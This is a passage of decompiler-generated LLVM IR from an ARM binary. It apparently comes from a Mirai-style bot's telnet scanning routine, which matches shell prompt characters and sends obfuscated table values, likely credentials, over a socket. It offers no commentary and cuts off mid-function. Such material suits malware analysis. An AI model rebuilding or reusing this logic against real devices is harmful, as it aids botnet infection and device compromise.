  store i1 %v2_feec, i1* %cpsr_c.global-to-local, align 1
  %v7_feec = icmp eq i8 %v3_fecc, 37
  store i1 %v7_feec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_feec, label %dec_label_pc_ff34, label %dec_label_pc_ff1c.preheader

dec_label_pc_ff1c.preheader:                      ; preds = %dec_label_pc_feec
  %v3_fef0 = add i32 %v0_f740, 28
  %v2_fef4 = add i32 %v3_fef0, %v3_feb8
  store i32 %v2_fef4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ff1c

dec_label_pc_ff00:                                ; preds = %bb451
  %v2_ff00 = icmp ugt i8 %v3_ff24, 35
  store i1 %v2_ff00, i1* %cpsr_c.global-to-local, align 1
  %v7_ff00 = icmp eq i8 %v3_ff24, 36
  store i1 %v7_ff00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ff00, label %dec_label_pc_ff34, label %dec_label_pc_ff08

dec_label_pc_ff08:                                ; preds = %dec_label_pc_ff00
  %v2_ff08 = icmp ugt i8 %v3_ff24, 34
  store i1 %v2_ff08, i1* %cpsr_c.global-to-local, align 1
  %v7_ff08 = icmp eq i8 %v3_ff24, 35
  store i1 %v7_ff08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ff08, label %dec_label_pc_ff34, label %dec_label_pc_ff10

dec_label_pc_ff10:                                ; preds = %dec_label_pc_ff08
  %v2_ff10 = icmp ugt i8 %v3_ff24, 36
  store i1 %v2_ff10, i1* %cpsr_c.global-to-local, align 1
  %v7_ff10 = icmp eq i8 %v3_ff24, 37
  store i1 %v7_ff10, i1* %cpsr_z.global-to-local, align 1
  %v1_ff14 = add i32 %v0_ff14, -1
  store i32 %v1_ff14, i32* %r3.global-to-local, align 4
  br i1 %v7_ff10, label %dec_label_pc_ff34, label %dec_label_pc_ff1c

dec_label_pc_ff1c:                                ; preds = %dec_label_pc_ff1c.preheader, %dec_label_pc_ff10
  %v0_ff14 = phi i32 [ %v2_fef4, %dec_label_pc_ff1c.preheader ], [ %v1_ff14, %dec_label_pc_ff10 ]
  %v0_ff1c = phi i32 [ %v1_febc, %dec_label_pc_ff1c.preheader ], [ %v1_ff1c, %dec_label_pc_ff10 ]
  %v1_ff1c = add i32 %v0_ff1c, -1
  store i32 %v1_ff1c, i32* %r1.global-to-local, align 4
  %v2_ff1c = icmp ne i32 %v0_ff1c, 0
  store i1 %v2_ff1c, i1* %cpsr_c.global-to-local, align 1
  %v7_ff1c = icmp eq i32 %v0_ff1c, 1
  store i1 %v7_ff1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ff1c, label %dec_label_pc_f6c0.backedge.thread562, label %dec_label_pc_ff24

dec_label_pc_ff24:                                ; preds = %dec_label_pc_ff1c
  %v1_ff24 = add i32 %v0_ff14, -2
  %v2_ff24 = inttoptr i32 %v1_ff24 to i8*
  %v3_ff24 = load i8, i8* %v2_ff24, align 1
  %v4_ff24 = zext i8 %v3_ff24 to i32
  store i32 %v4_ff24, i32* %r2.global-to-local, align 4
  %v2_ff28 = icmp ugt i8 %v3_ff24, 61
  store i1 %v2_ff28, i1* %cpsr_c.global-to-local, align 1
  %v7_ff28 = icmp eq i8 %v3_ff24, 62
  store i1 %v7_ff28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ff28, label %dec_label_pc_ff34, label %bb451

bb451:                                            ; preds = %dec_label_pc_ff24
  %v3_ff2c = icmp ugt i8 %v3_ff24, 57
  store i1 %v3_ff2c, i1* %cpsr_c.global-to-local, align 1
  %v8_ff2c = icmp eq i8 %v3_ff24, 58
  store i1 %v8_ff2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ff2c, label %dec_label_pc_ff34, label %dec_label_pc_ff00

dec_label_pc_ff34:                                ; preds = %dec_label_pc_ff24, %bb451, %dec_label_pc_ff10, %dec_label_pc_ff08, %dec_label_pc_ff00, %dec_label_pc_feec, %dec_label_pc_fec8, %dec_label_pc_fee4, %dec_label_pc_fedc, %bb450
  %v0_ff38 = phi i32 [ %v1_febc, %dec_label_pc_feec ], [ %v1_febc, %dec_label_pc_fec8 ], [ %v1_febc, %dec_label_pc_fee4 ], [ %v1_febc, %dec_label_pc_fedc ], [ %v1_febc, %bb450 ], [ %v1_ff1c, %dec_label_pc_ff00 ], [ %v1_ff1c, %dec_label_pc_ff08 ], [ %v1_ff1c, %dec_label_pc_ff10 ], [ %v1_ff1c, %bb451 ], [ %v1_ff1c, %dec_label_pc_ff24 ]
  %v1_ff38 = add i32 %v0_ff38, 1
  store i32 %v1_ff38, i32* @r7, align 4
  %v1_ff3c = call i32 @table_unlock_val(i32 6)
  store i32 %v2_1001c, i32* %r1.global-to-local, align 4
  %v3_ff4c = call i32 @table_retrieve_val(i32 6, i32* nonnull %stack_var_-60)
  %v3_ff50 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_ff50, i32* %r2.global-to-local, align 4
  store i32 %v3_ff4c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_ff5c = load i32, i32* @r6, align 4
  %v1_ff5c = add i32 %v0_ff5c, 4
  %v2_ff5c = inttoptr i32 %v1_ff5c to i32*
  %v3_ff5c = load i32, i32* %v2_ff5c, align 4
  %v4_ff60 = call i32 @__libc_send(i32 %v3_ff5c, i32 %v3_ff4c, i32 %v3_ff50, i32 16384)
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19b10.208 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_ff70 = load i32, i32* @r6, align 4
  %v1_ff70 = add i32 %v0_ff70, 4
  %v2_ff70 = inttoptr i32 %v1_ff70 to i32*
  %v3_ff70 = load i32, i32* %v2_ff70, align 4
  %v4_ff74 = call i32 @__libc_send(i32 %v3_ff70, i32 ptrtoint ([3 x i8]* @global_var_19b10.208 to i32), i32 2, i32 16384)
  %v1_ff7c = call i32 @table_lock_val(i32 6)
  store i32 8, i32* @r3, align 4
  %v1_ff84 = load i32, i32* @r6, align 4
  %v2_ff84 = add i32 %v1_ff84, 12
  %v3_ff84 = inttoptr i32 %v2_ff84 to i32*
  store i32 8, i32* %v3_ff84, align 4
  br label %dec_label_pc_f910

dec_label_pc_ff8c:                                ; preds = %dec_label_pc_f740
  %v1_ff8c = add i32 %v0_f740, 24
  %v2_ff8c = inttoptr i32 %v1_ff8c to i32*
  %v3_ff8c = load i32, i32* %v2_ff8c, align 4
  store i32 %v3_ff8c, i32* %r2.global-to-local, align 4
  %v1_ff90 = add i32 %v3_ff8c, -1
  store i32 %v1_ff90, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ff94 = icmp eq i32 %v1_ff90, 0
  store i1 %v2_ff94, i1* %cpsr_z.global-to-local, align 1
  %tmp452 = icmp slt i32 %v1_ff90, 1
  br i1 %tmp452, label %dec_label_pc_10008, label %dec_label_pc_ff9c

dec_label_pc_ff9c:                                ; preds = %dec_label_pc_ff8c
  %v2_ff9c = add i32 %v1_ff90, %v0_f740
  store i32 %v2_ff9c, i32* %r3.global-to-local, align 4
  %v1_ffa0 = add i32 %v2_ff9c, 28
  %v2_ffa0 = inttoptr i32 %v1_ffa0 to i8*
  %v3_ffa0 = load i8, i8* %v2_ffa0, align 1
  %v4_ffa0 = zext i8 %v3_ffa0 to i32
  store i32 %v4_ffa0, i32* %r3.global-to-local, align 4
  %v2_ffa4 = icmp ugt i8 %v3_ffa0, 61
  store i1 %v2_ffa4, i1* %cpsr_c.global-to-local, align 1
  %v7_ffa4 = icmp eq i8 %v3_ffa0, 62
  store i1 %v7_ffa4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ffa4, label %dec_label_pc_10120, label %bb453

bb453:                                            ; preds = %dec_label_pc_ff9c
  %v3_ffa8 = icmp ugt i8 %v3_ffa0, 57
  store i1 %v3_ffa8, i1* %cpsr_c.global-to-local, align 1
  %v8_ffa8 = icmp eq i8 %v3_ffa0, 58
  store i1 %v8_ffa8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ffa8, label %dec_label_pc_10120, label %dec_label_pc_ffb0

dec_label_pc_ffb0:                                ; preds = %bb453
  %v2_ffb0 = icmp ugt i8 %v3_ffa0, 35
  store i1 %v2_ffb0, i1* %cpsr_c.global-to-local, align 1
  %v7_ffb0 = icmp eq i8 %v3_ffa0, 36
  store i1 %v7_ffb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ffb0, label %dec_label_pc_10120, label %dec_label_pc_ffb8

dec_label_pc_ffb8:                                ; preds = %dec_label_pc_ffb0
  %v2_ffb8 = icmp ugt i8 %v3_ffa0, 34
  store i1 %v2_ffb8, i1* %cpsr_c.global-to-local, align 1
  %v7_ffb8 = icmp eq i8 %v3_ffa0, 35
  store i1 %v7_ffb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ffb8, label %dec_label_pc_10120, label %dec_label_pc_ffc0

dec_label_pc_ffc0:                                ; preds = %dec_label_pc_ffb8
  %v2_ffc0 = icmp ugt i8 %v3_ffa0, 36
  store i1 %v2_ffc0, i1* %cpsr_c.global-to-local, align 1
  %v7_ffc0 = icmp eq i8 %v3_ffa0, 37
  store i1 %v7_ffc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ffc0, label %dec_label_pc_10120, label %dec_label_pc_10000.preheader

dec_label_pc_10000.preheader:                     ; preds = %dec_label_pc_ffc0
  %v3_ffc4 = add i32 %v0_f740, 28
  %v2_ffc8 = add i32 %v3_ffc4, %v3_ff8c
  store i32 %v2_ffc8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10000

dec_label_pc_ffd4:                                ; preds = %dec_label_pc_10000
  %v1_ffd4 = add i32 %v0_fff8, -2
  %v2_ffd4 = inttoptr i32 %v1_ffd4 to i8*
  %v3_ffd4 = load i8, i8* %v2_ffd4, align 1
  %v4_ffd4 = zext i8 %v3_ffd4 to i32
  store i32 %v4_ffd4, i32* %r2.global-to-local, align 4
  %v2_ffd8 = icmp ugt i8 %v3_ffd4, 61
  store i1 %v2_ffd8, i1* %cpsr_c.global-to-local, align 1
  %v7_ffd8 = icmp eq i8 %v3_ffd4, 62
  store i1 %v7_ffd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ffd8, label %dec_label_pc_10120, label %bb454

bb454:                                            ; preds = %dec_label_pc_ffd4
  %v3_ffdc = icmp ugt i8 %v3_ffd4, 57
  store i1 %v3_ffdc, i1* %cpsr_c.global-to-local, align 1
  %v8_ffdc = icmp eq i8 %v3_ffd4, 58
  store i1 %v8_ffdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ffdc, label %dec_label_pc_10120, label %dec_label_pc_ffe4

dec_label_pc_ffe4:                                ; preds = %bb454
  %v2_ffe4 = icmp ugt i8 %v3_ffd4, 35
  store i1 %v2_ffe4, i1* %cpsr_c.global-to-local, align 1
  %v7_ffe4 = icmp eq i8 %v3_ffd4, 36
  store i1 %v7_ffe4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ffe4, label %dec_label_pc_10120, label %dec_label_pc_ffec

dec_label_pc_ffec:                                ; preds = %dec_label_pc_ffe4
  %v2_ffec = icmp ugt i8 %v3_ffd4, 34
  store i1 %v2_ffec, i1* %cpsr_c.global-to-local, align 1
  %v7_ffec = icmp eq i8 %v3_ffd4, 35
  store i1 %v7_ffec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ffec, label %dec_label_pc_10120, label %dec_label_pc_fff4

dec_label_pc_fff4:                                ; preds = %dec_label_pc_ffec
  %v2_fff4 = icmp ugt i8 %v3_ffd4, 36
  store i1 %v2_fff4, i1* %cpsr_c.global-to-local, align 1
  %v7_fff4 = icmp eq i8 %v3_ffd4, 37
  store i1 %v7_fff4, i1* %cpsr_z.global-to-local, align 1
  %v1_fff8 = add i32 %v0_fff8, -1
  store i32 %v1_fff8, i32* %r3.global-to-local, align 4
  br i1 %v7_fff4, label %dec_label_pc_10120, label %dec_label_pc_10000

dec_label_pc_10000:                               ; preds = %dec_label_pc_10000.preheader, %dec_label_pc_fff4
  %v0_fff8 = phi i32 [ %v2_ffc8, %dec_label_pc_10000.preheader ], [ %v1_fff8, %dec_label_pc_fff4 ]
  %v0_10000 = phi i32 [ %v1_ff90, %dec_label_pc_10000.preheader ], [ %v1_10000, %dec_label_pc_fff4 ]
  %v1_10000 = add i32 %v0_10000, -1
  store i32 %v1_10000, i32* %r1.global-to-local, align 4
  %v2_10000 = icmp ne i32 %v0_10000, 0
  store i1 %v2_10000, i1* %cpsr_c.global-to-local, align 1
  %v7_10000 = icmp eq i32 %v0_10000, 1
  store i1 %v7_10000, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10000, label %dec_label_pc_10008, label %dec_label_pc_ffd4

dec_label_pc_10008:                               ; preds = %dec_label_pc_10000, %dec_label_pc_ff8c
  %v1_1000c = call i32 @table_unlock_val(i32 31)
  %v1_10014 = call i32 @table_unlock_val(i32 32)
  store i32 %v2_1001c, i32* %r1.global-to-local, align 4
  %v3_10024 = call i32 @table_retrieve_val(i32 31, i32* nonnull %stack_var_-60)
  store i32 %v3_10024, i32* @r4, align 4
  store i32 %v2_1001c, i32* %r1.global-to-local, align 4
  %v3_10038 = call i32 @table_retrieve_val(i32 32, i32* nonnull %stack_var_-60)
  %v3_1003c = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_10038, i32* @r5, align 4
  %v0_10044 = load i32, i32* @r4, align 4
  store i32 %v0_10044, i32* %r2.global-to-local, align 4
  %v1_10048 = add i32 %v3_1003c, -1
  store i32 %v1_10048, i32* %r3.global-to-local, align 4
  %v0_1004c = load i32, i32* @fp, align 4
  %v0_10050 = load i32, i32* @r6, align 4
  %v1_10050 = add i32 %v0_10050, 24
  %v2_10050 = inttoptr i32 %v1_10050 to i32*
  %v3_10050 = load i32, i32* %v2_10050, align 4
  store i32 %v3_10050, i32* %r1.global-to-local, align 4
  %v4_10054 = call i32 @util_memsearch(i32 %v0_1004c, i32 %v3_10050, i32 %v0_10044, i32 %v1_10048)
  %v2_10058 = icmp eq i32 %v4_10054, -1
  store i1 %v2_10058, i1* %cpsr_c.global-to-local, align 1
  %v7_10058 = icmp eq i32 %v4_10054, -1
  store i1 %v7_10058, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10058, label %dec_label_pc_10068, label %dec_label_pc_10090

dec_label_pc_10068:                               ; preds = %dec_label_pc_10008
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v3_10068 = load i32, i32* %stack_var_-60, align 4
  %v0_1006c = load i32, i32* @r5, align 4
  store i32 %v0_1006c, i32* %r2.global-to-local, align 4
  %v1_10070 = add i32 %v3_10068, -1
  store i32 %v1_10070, i32* %r3.global-to-local, align 4
  %v0_10074 = load i32, i32* @fp, align 4
  %v0_10078 = load i32, i32* @r6, align 4
  %v1_10078 = add i32 %v0_10078, 24
  %v2_10078 = inttoptr i32 %v1_10078 to i32*
  %v3_10078 = load i32, i32* %v2_10078, align 4
  store i32 %v3_10078, i32* %r1.global-to-local, align 4
  %v4_1007c = call i32 @util_memsearch(i32 %v0_10074, i32 %v3_10078, i32 %v0_1006c, i32 %v1_10070)
  %v1_10080 = add i32 %v4_1007c, 1
  store i32 %v1_10080, i32* @r7, align 4
  %v2_10080 = icmp eq i32 %v4_1007c, -1
  store i1 %v2_10080, i1* %cpsr_c.global-to-local, align 1
  %v7_10080 = icmp eq i32 %v1_10080, 0
  store i1 %v7_10080, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10080, label %dec_label_pc_10430, label %dec_label_pc_10090

dec_label_pc_10090:                               ; preds = %dec_label_pc_10068, %dec_label_pc_10008
  store i32 1, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  %v1_10094 = call i32 @table_lock_val(i32 31)
  %v1_1009c = call i32 @table_lock_val(i32 32)
  %v0_100a0 = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_100a0 = icmp eq i32 %v0_100a0, 0
  store i1 %v2_100a0, i1* %cpsr_z.global-to-local, align 1
  %tmp455 = icmp slt i32 %v0_100a0, 1
  br i1 %tmp455, label %dec_label_pc_f908, label %dec_label_pc_10134

dec_label_pc_100ac:                               ; preds = %dec_label_pc_fa50
  store i32 %v2_100b0, i32* @r8, align 4
  store i32 ptrtoint (i32* @global_var_19b1c.210 to i32), i32* @r1, align 4
  store i32 3, i32* @r2, align 4
  store i32 %v2_100b0, i32* @r0, align 4
  store i32 %v2_100c4, i32* @sl, align 4
  %v0_100c8 = call i32 @memcpy()
  store i32 9, i32* @r2, align 4
  store i32 %v2_100c4, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_19b13.212 to i32), i32* @r1, align 4
  %v0_100d8 = call i32 @memcpy()
  %v0_100dc = load i32, i32* @r6, align 4
  %v1_100dc = add i32 %v0_100dc, 24
  %v2_100dc = inttoptr i32 %v1_100dc to i32*
  %v3_100dc = load i32, i32* %v2_100dc, align 4
  %v0_100e0 = load i32, i32* @r4, align 4
  %v1_100e0 = add i32 %v0_100e0, 2
  store i32 %v1_100e0, i32* %r2.global-to-local, align 4
  %v0_100e4 = load i32, i32* @fp, align 4
  %v2_100e4 = add i32 %v0_100e4, %v3_100dc
  store i32 %v2_100e4, i32* @r3, align 4
  %v3_100e8 = icmp uge i32 %v2_100e4, %v1_100e0
  store i1 %v3_100e8, i1* %cpsr_c.global-to-local, align 1
  %v9_100e8 = icmp eq i32 %v2_100e4, %v1_100e0
  store i1 %v9_100e8, i1* %cpsr_z.global-to-local, align 1
  %v2_100ec = xor i1 %v3_100e8, true
  %v3_100ec = or i1 %v9_100e8, %v2_100ec
  br i1 %v3_100ec, label %dec_label_pc_100ac.dec_label_pc_facc.loopexit_crit_edge, label %dec_label_pc_100f0

dec_label_pc_100ac.dec_label_pc_facc.loopexit_crit_edge: ; preds = %dec_label_pc_100ac
  %v0_facc.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_facc

dec_label_pc_100f0:                               ; preds = %dec_label_pc_100ac
  %v2_100f0 = inttoptr i32 %v1_100e0 to i8*
  %v3_100f0 = load i8, i8* %v2_100f0, align 1
  %v4_100f0 = zext i8 %v3_100f0 to i32
  store i32 %v4_100f0, i32* %r3.global-to-local, align 4
  %v2_100f4 = icmp ugt i8 %v3_100f0, 30
  store i1 %v2_100f4, i1* %cpsr_c.global-to-local, align 1
  %v7_100f4 = icmp eq i8 %v3_100f0, 31
  store i1 %v7_100f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_100f4, label %dec_label_pc_101c0, label %dec_label_pc_100fc

dec_label_pc_100fc:                               ; preds = %dec_label_pc_100f0
  %v1_100fc = inttoptr i32 %v0_100e0 to i8*
  %v2_100fc = load i8, i8* %v1_100fc, align 1
  %v3_100fc = zext i8 %v2_100fc to i32
  store i32 %v3_100fc, i32* %r3.global-to-local, align 4
  %v2_10100 = icmp ugt i8 %v2_100fc, -4
  store i1 %v2_10100, i1* %cpsr_c.global-to-local, align 1
  %v7_10100 = icmp eq i8 %v2_100fc, -3
  store i1 %v7_10100, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10100, label %.thread147, label %dec_label_pc_10110

.thread147:                                       ; preds = %dec_label_pc_100fc
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v1_100fc, align 1
  %v0_1010c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1010c.pr.pr, label %dec_label_pc_fa64, label %.thread147.dec_label_pc_10110thread-pre-split_crit_edge

.thread147.dec_label_pc_10110thread-pre-split_crit_edge: ; preds = %.thread147
  %v0_10110.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10110

dec_label_pc_10110:                               ; preds = %dec_label_pc_100fc, %.thread147.dec_label_pc_10110thread-pre-split_crit_edge
  %v0_10110.pr = phi i32 [ %v0_10110.pr.pre, %.thread147.dec_label_pc_10110thread-pre-split_crit_edge ], [ %v3_100fc, %dec_label_pc_100fc ]
  %v2_10110 = icmp ugt i32 %v0_10110.pr, 250
  store i1 %v2_10110, i1* %cpsr_c.global-to-local, align 1
  %v7_10110 = icmp eq i32 %v0_10110.pr, 251
  store i1 %v7_10110, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10110, label %bb456, label %dec_label_pc_fa64

bb456:                                            ; preds = %dec_label_pc_10110
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_10118 = load i32, i32* @r4, align 4
  %v4_10118 = inttoptr i32 %v3_10118 to i8*
  store i8 -3, i8* %v4_10118, align 1
  br label %dec_label_pc_fa64

dec_label_pc_10120:                               ; preds = %dec_label_pc_ffd4, %dec_label_pc_fff4, %dec_label_pc_ffec, %dec_label_pc_ffe4, %bb454, %dec_label_pc_ffc0, %dec_label_pc_ff9c, %dec_label_pc_ffb8, %dec_label_pc_ffb0, %bb453
  %v0_10124 = phi i32 [ %v1_ff90, %dec_label_pc_ffc0 ], [ %v1_ff90, %dec_label_pc_ff9c ], [ %v1_ff90, %dec_label_pc_ffb8 ], [ %v1_ff90, %dec_label_pc_ffb0 ], [ %v1_ff90, %bb453 ], [ %v1_10000, %bb454 ], [ %v1_10000, %dec_label_pc_ffe4 ], [ %v1_10000, %dec_label_pc_ffec ], [ %v1_10000, %dec_label_pc_fff4 ], [ %v1_10000, %dec_label_pc_ffd4 ]
  %v1_10124 = add i32 %v0_10124, 1
  store i32 %v1_10124, i32* @r7, align 4
  %v1_10128 = call i32 @table_lock_val(i32 31)
  %v1_10130 = call i32 @table_lock_val(i32 32)
  br label %dec_label_pc_10134

dec_label_pc_10134:                               ; preds = %dec_label_pc_10090, %dec_label_pc_10120
  %v0_10134 = load i32, i32* @r6, align 4
  %v1_10134 = inttoptr i32 %v0_10134 to i32*
  %v2_10134 = load i32, i32* %v1_10134, align 4
  store i32 %v2_10134, i32* %r3.global-to-local, align 4
  %v1_10138 = add i32 %v0_10134, 4
  %v2_10138 = inttoptr i32 %v1_10138 to i32*
  %v3_10138 = load i32, i32* %v2_10138, align 4
  %v1_1013c = add i32 %v2_10134, 12
  %v2_1013c = inttoptr i32 %v1_1013c to i8*
  %v3_1013c = load i8, i8* %v2_1013c, align 1
  %v4_1013c = zext i8 %v3_1013c to i32
  store i32 %v4_1013c, i32* %r2.global-to-local, align 4
  %v1_10140 = inttoptr i32 %v2_10134 to i32*
  %v2_10140 = load i32, i32* %v1_10140, align 4
  store i32 %v2_10140, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_10148 = call i32 @__libc_send(i32 %v3_10138, i32 %v2_10140, i32 %v4_1013c, i32 16384)
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10150 = load i32, i32* @r6, align 4
  %v1_10150 = add i32 %v0_10150, 4
  %v2_10150 = inttoptr i32 %v1_10150 to i32*
  %v3_10150 = load i32, i32* %v2_10150, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19b10.208 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_1015c = call i32 @__libc_send(i32 %v3_10150, i32 ptrtoint ([3 x i8]* @global_var_19b10.208 to i32), i32 2, i32 16384)
  store i32 4, i32* @r3, align 4
  %v1_10164 = load i32, i32* @r6, align 4
  %v2_10164 = add i32 %v1_10164, 12
  %v3_10164 = inttoptr i32 %v2_10164 to i32*
  store i32 4, i32* %v3_10164, align 4
  br label %dec_label_pc_f908

dec_label_pc_1016c:                               ; preds = %dec_label_pc_fe0c, %dec_label_pc_fe24, %dec_label_pc_fe1c, %bb448, %dec_label_pc_fdf8, %dec_label_pc_fddc, %dec_label_pc_fdf0, %bb447
  %v0_10170 = phi i32 [ %v1_fdd0, %dec_label_pc_fdf8 ], [ %v1_fdd0, %dec_label_pc_fddc ], [ %v1_fdd0, %dec_label_pc_fdf0 ], [ %v1_fdd0, %bb447 ], [ %v1_fe30, %bb448 ], [ %v1_fe30, %dec_label_pc_fe1c ], [ %v1_fe30, %dec_label_pc_fe24 ], [ %v1_fe30, %dec_label_pc_fe0c ]
  %v1_10170 = add i32 %v0_10170, 1
  store i32 %v1_10170, i32* @r7, align 4
  %v1_10174 = call i32 @table_lock_val(i32 30)
  br label %dec_label_pc_fe80

dec_label_pc_1017c:                               ; preds = %dec_label_pc_f7e4
  %v0_10184 = load i32, i32* @r6, align 4
  %v1_10184 = add i32 %v0_10184, 4
  %v2_10184 = inttoptr i32 %v1_10184 to i32*
  %v3_10184 = load i32, i32* %v2_10184, align 4
  %v1_10188 = call i32 @__GI___libc_close(i32 %v3_10184)
  %v0_1018c = load i32, i32* @r6, align 4
  %v1_1018c = add i32 %v0_1018c, 384
  %v2_1018c = inttoptr i32 %v1_1018c to i8*
  %v3_1018c = load i8, i8* %v2_1018c, align 1
  %v4_1018c = zext i8 %v3_1018c to i32
  %v1_10190 = add nuw nsw i32 %v4_1018c, 1
  %v1_10194 = urem i32 %v1_10190, 256
  store i32 %v1_10194, i32* @r3, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_1019c = icmp ugt i32 %v1_10194, 9
  store i1 %v2_1019c, i1* %cpsr_c.global-to-local, align 1
  %v7_1019c = icmp eq i32 %v1_10194, 10
  store i1 %v7_1019c, i1* %cpsr_z.global-to-local, align 1
  %v2_101a0 = add i32 %v0_1018c, 4
  %v3_101a0 = inttoptr i32 %v2_101a0 to i32*
  store i32 -1, i32* %v3_101a0, align 4
  %v0_101a4 = load i32, i32* @r3, align 4
  %v1_101a4 = trunc i32 %v0_101a4 to i8
  %v2_101a4 = load i32, i32* @r6, align 4
  %v3_101a4 = add i32 %v2_101a4, 384
  %v4_101a4 = inttoptr i32 %v3_101a4 to i8*
  store i8 %v1_101a4, i8* %v4_101a4, align 1
  %v0_101a8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_101a8, label %dec_label_pc_101ac, label %dec_label_pc_10208

dec_label_pc_101ac:                               ; preds = %dec_label_pc_1017c
  store i32 0, i32* @r3, align 4
  store i32 -1, i32* @r7, align 4
  %v1_101b4 = load i32, i32* @r6, align 4
  %v2_101b4 = add i32 %v1_101b4, 12
  %v3_101b4 = inttoptr i32 %v2_101b4 to i32*
  store i32 0, i32* %v3_101b4, align 4
  %v0_101b8 = load i32, i32* @r3, align 4
  %v1_101b8 = trunc i32 %v0_101b8 to i8
  %v2_101b8 = load i32, i32* @r6, align 4
  %v3_101b8 = add i32 %v2_101b8, 384
  %v4_101b8 = inttoptr i32 %v3_101b8 to i8*
  store i8 %v1_101b8, i8* %v4_101b8, align 1
  br label %dec_label_pc_f910

dec_label_pc_101c0:                               ; preds = %dec_label_pc_100f0
  store i32 %v2_100b0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v1_101cc = add i32 %v0_100dc, 4
  %v2_101cc = inttoptr i32 %v1_101cc to i32*
  %v3_101cc = load i32, i32* %v2_101cc, align 4
  %v4_101d0 = call i32 @__libc_send(i32 %v3_101cc, i32 %v2_100b0, i32 3, i32 16384)
  br label %dec_label_pc_fab0

dec_label_pc_101e4:                               ; preds = %dec_label_pc_f6c8
  store i32 %.pre, i32* @r0, align 4
  %v1_101ec = add i32 %v0_101e4, 92
  store i32 %v1_101ec, i32* @r1, align 4
  store i32 292, i32* @r2, align 4
  %v3_101f4 = call i32 @memmove(i32 %.pre, i32 %v1_101ec, i32 292)
  %v0_101f8 = load i32, i32* @r6, align 4
  %v1_101f8 = add i32 %v0_101f8, 24
  %v2_101f8 = inttoptr i32 %v1_101f8 to i32*
  %v3_101f8 = load i32, i32* %v2_101f8, align 4
  %v1_101fc = add i32 %v3_101f8, -64
  store i32 %v1_101fc, i32* %r3.global-to-local, align 4
  store i32 %v1_101fc, i32* %v2_101f8, align 4
  br label %dec_label_pc_f6d8

dec_label_pc_10208:                               ; preds = %dec_label_pc_1017c
  %v0_10208 = load i32, i32* @r6, align 4
  store i32 %v0_10208, i32* @r0, align 4
  %v0_1020c = call i32 @setup_connection()
  store i32 -1, i32* @r7, align 4
  br label %dec_label_pc_f910

dec_label_pc_10218:                               ; preds = %dec_label_pc_f680
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-60, align 4
  store i32 %v2_edec, i32* %r3.global-to-local, align 4
  store i32 %v2_1001c, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 1, i32* @r1, align 4
  store i32 0, i32* %stack_var_-56, align 4
  %v5_10240 = call i32 @getsockopt(i32 %v3_f674, i32 1, i32 4, i32 %v2_edec, i32 %v2_1001c)
  %v3_10244 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_10244, i32* %r3.global-to-local, align 4
  %v2_10248 = or i32 %v3_10244, %v5_10240
  %v4_10248 = icmp eq i32 %v2_10248, 0
  store i1 %v4_10248, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_10248, label %dec_label_pc_10250, label %dec_label_pc_102dc

dec_label_pc_10250:                               ; preds = %dec_label_pc_10218
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_10254 = load i32, i32* @r6, align 4
  %v2_10254 = add i32 %v1_10254, 12
  %v3_10254 = inttoptr i32 %v2_10254 to i32*
  store i32 2, i32* %v3_10254, align 4
  %v0_10258 = call i32 @rand_next()
  %v2_10260 = load i16, i16* bitcast (i16** @global_var_22474.149 to i16*), align 4
